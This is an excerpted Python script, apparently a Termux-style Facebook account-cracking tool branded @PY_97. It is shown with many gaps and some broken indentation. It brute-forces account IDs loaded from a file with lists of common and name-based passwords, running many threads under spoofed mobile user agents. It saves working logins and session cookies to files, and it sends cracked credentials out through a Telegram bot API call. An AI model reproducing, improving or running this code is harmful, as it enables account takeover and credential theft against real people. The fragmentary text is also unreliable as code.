...
os.system('xdg-open https://t.me/PY_97')
...
def compare_phone_time():
    try:
        ...
        print(f'ﺮﻀﺘﻧﺍ ﻞﻴﻐﺸﺘﻟﺍ ﺭﺎﺟ: {e}')
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2028,6,15)
if now >=target:print('@PY_97 Subscription completed, contact Commander Abu tez, he will do it for you ')
else:print('Wait a minute ')
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
print('\n\x1b[1;37m Paid and cut yum president')
...
\x1b[1;33m ━━━━━━━━━━━━━━━━━━━ \x1b[1;32m 𝐀𝐁𝐁𝐎𝐔𝐃 𓏵\x1b[1;34m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;32m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌.  \x1b[1;32m: @PY_97
\x1b[1;36m{+} \x1b[1;33m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌   \x1b[1;33m: \x1b[1;33m @PY_97
\x1b[1;36m{+} \x1b[1;35m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌   \x1b[1;35m: https://t.me/PY_97
\x1b[1;33m ━━━━━━━━━━━━━━━━━━━ \x1b[1;32mTEZ 𝐀𝐁𝐁𝐎𝐔𝐃 𓏵\x1b[1;34m━━━━━━━━━━━━━━━━━━━━               
"""
                               
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @PY_97 ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n• DeCoDe By ALI | @PY_97 •\n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@PY_97.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;35m [01] \x1b[1;92m𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐕𝐈𝐏')
                        linex()
                        xd=input('\x1b[1;96m𝐂𝐇𝐎𝐎𝐒𝐄  \x1b[1;94m: ')
                        if xd in ['1','01']:
                               
                                clear()
                                file = input('\x1b[1;92m𝐍𝐀𝐌𝐄 𝐅𝐈𝐋𝐄  \x1b[1;94m: ')
                                try:
                                ...
                                linex()
                                mthd=input('\x1b[1;96m𝐂𝐇𝐎𝐎𝐒𝐄  \x1b[1;94m: ')
                                clear()
                                plist = []
                                print('\x1b[1;92m [01] \x1b[1;31m𝐏𝐀𝐒𝐒𝐎𝐖𝐑𝐃 𝐍𝐔𝐌𝐁𝐄𝐑 ‌ \n\x1b[1;92m [02] \x1b[1;33m𝐂𝐇𝐎𝐎𝐒𝐄 𝐏𝐀𝐒𝐒𝐎𝐖𝐑𝐃  \n\x1b[1;92m [03] \x1b[1;32m𝐏𝐀𝐒𝐒𝐎𝐖𝐑𝐃 𝐍𝐀𝐌𝐄 \n\x1b[1;92m [04] \x1b[1;94m𝐏𝐀𝐒𝐒𝐎𝐖𝐑𝐃 𝐍𝐔𝐌𝐁𝐄𝐑 𝐀𝐍𝐃 𝐋𝐀𝐒𝐓 𝐍𝐀𝐌𝐄');linex()
                                ppp=input('\x1b[1;96m𝐂𝐇𝐎𝐎𝐒𝐄  \x1b[1;94m: ')
                                if ppp in ('1', '01'):
                                        ...
                                        plist.append('12345@@')
                                        plist.append('12345678@@')
                                        plist.append('1234@1234')
                                        plist.append('12345@@')
                                ...
                                if ppp in ('3', '03'):
                                        ...
                                        plist.append('19851985')
                                        plist.append('1234567890qwertyuiop')
                                ...
                                if ppp in ('4', '04'):
                                        ...
                                        plist.append('poiuytrewqasdfghjk')
                                        plist.append('11110000')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print('\x1b[1;33m𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒  \x1b[1;94m: \x1b[1;96m' + total_ids)
                                        print('\x1b[1;32mTEZ 𝐎𝐅 𝐓𝐎𝐎𝐋𝐒 𝐀𝐁𝐁𝐎𝐔𝐃 ')
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\x1b[1;37m [\x1b[1;32mPY_97\x1b[1;37m] \x1b[1;37m[\x1b[1;32m{loop}\x1b[1;37m] \x1b[1;37m[\x1b[1;32mOK\x1b[1;37m/\x1b[1;91mCP\x1b[1;37m] \x1b[1;37m[\x1b[1;32m{len(oks)}\x1b[1;37m] \x1b[1;37m[\x1b[1;96m{p}%\x1b[1;37m]\x1b[1;37m');sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''DECODED BY ALI | @PY_97\n
\r\x1b[1;32m𝙶𝙾𝙾𝙳 ✔    
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ LEADER ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ LEADER ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : @PY_97 - @PY_97
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ    
                ''')
                                statusok = f'''DECODED BY ALI | @PY_97\n
       𝙶𝙾𝙾𝙳    ✔    
      ᯓᯓᯓᯓᯓ LEADER ᯓᯓᯓᯓᯓ
        •  𝙴𝙼𝙰𝙸𝙻     : {ids}
        •  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
      ᯓᯓᯓᯓᯓ LEADER ᯓᯓᯓᯓᯓ
        • 𝙱𝚈 : @PY_97 - @PY_97    
                ...
                '''
                                ...
                                open('/sdcard/@PY_97-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@PY_97-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ    
                '''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/@PY_97-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write(f'\r\x1b[1;37m[PY_97] [{loop}] \x1b[1;37m[OK={len(oks)}] [{p}%]\x1b[1;37m');sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ @PY_97 ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @PY_97 - @PY_97
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [@PY_97-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/@PY_97-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@PY_97] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@PY_97-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@PY_97-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@PY_97CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@PY_97-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@PY_97-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@PY_97_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@PY_97-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@PY_97-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
